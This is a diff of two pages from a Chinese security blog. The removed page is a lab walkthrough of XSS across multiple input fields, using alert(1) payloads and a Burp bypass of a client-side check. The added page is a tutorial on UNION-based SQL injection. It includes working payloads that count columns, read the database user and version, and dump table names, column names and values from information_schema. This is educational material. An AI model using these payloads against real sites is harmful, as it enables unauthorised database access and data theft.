@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（三）跨站脚本XSS之多点输入, Wkai">
+    <meta name="keywords" content="（三）SQL注入—联合注入原理, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（三）跨站脚本XSS之多点输入 | Wkai</title>
+    <title>（三）SQL注入—联合注入原理 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(5).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（三）跨站脚本XSS之多点输入</h1>
+                    <h1 class="description center-align post-title">（三）SQL注入—联合注入原理</h1>
                 </div>
             </div>
         </div>
@@ -321,13 +321,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/xss/">
-                                <span class="chip bg-color">xss</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -335,8 +331,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/XSS/" class="post-category">
-                                XSS
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
+                                SQL注入
                             </a>
                         
                     </div>
@@ -348,7 +344,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-28
+                    2020-08-17
                 </div>
                 
 
@@ -365,65 +361,101 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <ul>
-<li>本篇也是讲xss的攻击思路。当存在多个输入点时。开发者可能会有疏忽，并没有做好每个输入点的过滤防御,我们应该尽可能对每个输入点进行测试，抓住破绽。    靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，靶场地址：<a href="https://tofu.exeye.run/output" target="_blank" rel="noopener">https://tofu.exeye.run/output</a></li>
-<li>打开页面是这样的</li>
+<li>本篇主要总结了下联合注入的原理，并且结合数据库证明这些原理，联合注入主要是靠union实现，union的功能是将右边的查询结果和左边的查询结果合并，所以大部分操作都是通过union实现的。</li>
+<li>首先列出测试用的表结构和数据</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(5).png" alt></p>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(6).png" alt="数据库test的所有表"></p>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(5).png" alt="表test2"></p>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(7).png" alt="表test3"></p>
 <ul>
-<li><p>按照套路我们直接看下他的javascript代码，发现存在两个输出点</p>
+<li>在参数后添加引号，尝试语法错误回显，并用and 1=1#或者and 1=1#测试报错</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#        页面返回正常</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">#        页面返回不正常</span>
+
+这里<span class="token comment" spellcheck="true">#的意思是注释掉结尾的引号</span>
+因为注入后的语句可能是 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>' 这结尾最后的引号是会报错的
+但是如果加了<span class="token comment" spellcheck="true">#，后面的引号就会被注释掉，变成：</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">#'</span>
+
+同样的注释方法还可以用<span class="token comment" spellcheck="true">--代替#，不同的数据库有不同的注释字符：</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--'</span></code></pre>
+<ul>
+<li>利用<strong>order by</strong>猜测字段的数量：<strong>order by后面加字段名或者列号，可以让查询结果以次字段排序</strong></li>
+</ul>
+<pre><code>?id=1%27%20order%0aby%0c2%23    --返回正常
+--上边用%0a和%0c的URL编码可以代替空格，到数据库后就是空格的意思
+
+?id=1%27 order by 3#            --返回正常
+?id=1%27 order by 4#            --返回正常
+?id=1%27 order by 5#            --返回错误
+--这就证明字段总数为4，不存在第五列
+
+在order by后面加入数字，可以代替字段名
+比如order by column1 就可以用 order by 1代替</code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(2).png" alt="用存在的列号排序后去查询"></p>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(1).png" alt="用不存在的列号4去查询"></p>
+<ul>
+<li>利用UNION联合查询，可以判断显示位置</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">#</span>
+
+id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> 查询了一个不存在的列，返回结果为一个空值
+<span class="token keyword">union</span> 右边查询的结果将会和左边的查询结果合并，重复的将会只显示一行
+<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> 直接返回一行值，内容为<span class="token number">1</span>，<span class="token number">2</span>，<span class="token number">3</span></code></pre>
+<ul>
+<li>假如SQL语句查询了所有字段，但是页面只是调用了其中几个字段的值</li>
+</ul>
+<pre><code>SELECT * FROM test2 where id=-1 UNION select 1,2,3;</code></pre><ul>
+<li><p>这个时候，我们就可以在UNION的右边插入想测试的值，比如1，2，3，假如页面中只显示了1和3，说明1和3的位置是能显示的，可以调用类似database()的函数</p>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard.png" alt></p>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(9).png" alt="将3换成database()，将会插入数据库名"></p>
 </li>
-<li><pre class=" language-javascript"><code class="language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.user-box-top'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.ipt-name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//将名字输入框中的内容加入到类user-box-top的标签中</span>
-        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.age-box-top'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.ipt-age'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">//将年龄输入框中的内容加入到类age-box-top的标签中</span>
-    <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
-</li>
-<li><p>输出点里标签里的内容可随意输入内容</p>
-</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(2).png" alt></p>
-<ul>
-<li>尝试从名字和年龄这两个输出点入手</li>
-<li>首先是名字，直接输入框上<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,但是情况好像不太妙，因为我们输入的&lt;&gt;好像会被过滤</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(6).png" alt></p>
-<ul>
-<li>所以只能考虑年龄框了，但是如果这都能成功的话，那未免也太傻逼了，年龄框被要求只能输入数字</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(9).png" alt></p>
-<ul>
-<li><p>所以这里有两种方法</p>
-<ul>
-<li><p>方法一：用burp抓包绕过</p>
-<ul>
-<li>输入正常的数据，然后用burp开启抓包</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(7).png" alt></p>
-<ul>
-<li>将年龄改为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(8).png" alt></p>
-<ul>
-<li>最后将数据包放掉，成功实现弹窗</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard.png" alt></p>
-</li>
-<li><p>方法二：直接修改前端代码</p>
-<ul>
-<li>观察源代码，我们发现，他只是在前端对输入做了限制，只允许输入数字</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(4).png" alt></p>
-<ul>
-<li>如果将这个限制直接删除，就不会提示限制了</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(3).png" alt></p>
-<ul>
-<li>提交数据直接弹窗</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(1).png" alt></p>
+<li><p>利用联合查询输出数据库信息</p>
 </li>
 </ul>
+<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>CONCAT_WS<span class="token punctuation">(</span>CHAR<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+
+<span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">--获取数据库用户名</span>
+<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--获取数据库名</span>
+version<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--获取数据库版本信息</span>
+
+concat_ws<span class="token punctuation">(</span>separator<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--含有分隔符地连接字符串 </span>
+<span class="token comment" spellcheck="true">--里边这的separator分隔符，用 char() 函数把 空格:空格 的ASCII码输出</span>
+
+<span class="token comment" spellcheck="true">--其它信息</span>
+@<span class="token variable">@datadir</span>                <span class="token comment" spellcheck="true">--数据库路径</span>
+@<span class="token variable">@version_compile_os</span>    <span class="token comment" spellcheck="true">--操作系统版本</span>
+
+</code></pre>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png" alt="查询到的用户名，数据库名，mysql版本"></p>
+<ul>
+<li>利用联合查询查询数据库test的所有表名</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'test'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">#</span>
+
+<span class="token comment" spellcheck="true">--information_schema.tables 从数据库information_schema中查询表tables，tables中存取了所有的表，并且这些表都有对应的数据库名，其中存储表名的字段名为table_name，存储</span>
+数据库名的字段名为table_schema
+<span class="token comment" spellcheck="true">--table_schema=数据库名16进制或者用单引号括起来</span>
+<span class="token comment" spellcheck="true">--limit 0,1 查询结果中从第0个数据开始只读取一个数据</span></code></pre>
+<ul>
+<li><p>不断地改变limit的第一个参数，就能爆出所有的表</p>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(4).png" alt></p>
+</li>
+<li><p>查询表test2的字段</p>
 </li>
 </ul>
+<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'test'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'test2'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">#</span>
+
+<span class="token comment" spellcheck="true">--information_schema.columns 从数据库information_schema中查询表columns，查询条件为数据库名table_schema和表名table_name，查询的值为字段名column_name</span>
+表<span class="token keyword">columns</span>中记录了所有的字段名
+<span class="token comment" spellcheck="true">--limit 0,1 查询结果中从第0个数据开始只读取一个数据</span></code></pre>
+<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(8).png" alt></p>
+<ul>
+<li>爆出表test3的所有字段值</li>
+</ul>
+<pre><code>union select 1,2,group_concat(sex) from test3;
+--用字段名sex从表中取数据
+group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(10).png" alt="字段sex的所有值，默认用逗号分割了"></p>
 
             </div>
             <hr/>
@@ -449,7 +481,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/">http://wkaiblog.cn/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/</a>
+                    <a href="http://wkaiblog.cn/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">http://wkaiblog.cn/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -486,11 +518,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/xss/">
-                                    <span class="chip bg-color">xss</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -656,53 +684,50 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/">
+                <a href="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(10).png" class="responsive-img" alt="（六）跨站脚本XSS之数据库存储">
+                        <img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png" class="responsive-img" alt="（三）SQL注入—联合注入原理">
                         
-                        <span class="card-title">（六）跨站脚本XSS之数据库存储</span>
+                        <span class="card-title">（三）SQL注入—联合注入原理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一 靶场说明
-本篇是对存储型xss的认识和利用。绕过过滤的方法也用到了前面介绍过的几个技巧。除此之外，我还分析了下靶场的实现原理。
+                            
+本篇主要总结了下联合注入的原理，并且结合数据库证明这些原理，联合注入主要是靠union实现，union的功能是将右边的查询结果和左边的查询结果合并，所以大部分操作都是通过union实现的。
+首先列出测试用的表结构和数据
 
-需要用到的技能：拼接绕过，引号转换
 
-靶场由知识盒子提供，靶场地址：https://tofu.exeye.
+
+
+
+在参数后
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/XSS/" class="post-category">
-                                    XSS
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    SQL注入
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/xss/">
-                        <span class="chip bg-color">xss</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -713,31 +738,34 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/">
+                <a href="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(2).png" class="responsive-img" alt="（五）跨站脚本XSS之长度限制">
+                        <img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(4).png" class="responsive-img" alt="用docker部署tomcat环境">
                         
-                        <span class="card-title">（五）跨站脚本XSS之长度限制</span>
+                        <span class="card-title">用docker部署tomcat环境</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-我们平时测试总会用alert(1)去测试是否存在xss漏洞，但真到了要利用这个漏洞。执行的代码就不是alert(1)这么简单了，一些输入点具有字符长度的限制，可能测试语句alert(1)可以顺利执行，但真正的利用代码就会很长，导致无法顺利
+                            前言
+最近因为想学习下jsp，所以需要学习tomcat的部署，但是整来整去，发现还是docker香，所以我索性就用docker来搭建这个环境了，顺便复习波docker的使用
+
+拉取镜像
+首先我们选择一个好的镜像，好的镜像很重要，可以通过关键
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/XSS/" class="post-category">
-                                    XSS
+                            <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-category">
+                                    环境搭建
                                 </a>
                             
                             
@@ -747,8 +775,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/xss/">
-                        <span class="chip bg-color">xss</span>
+                    <a href="/tags/docker/">
+                        <span class="chip bg-color">docker</span>
                     </a>
                     
                 </div>
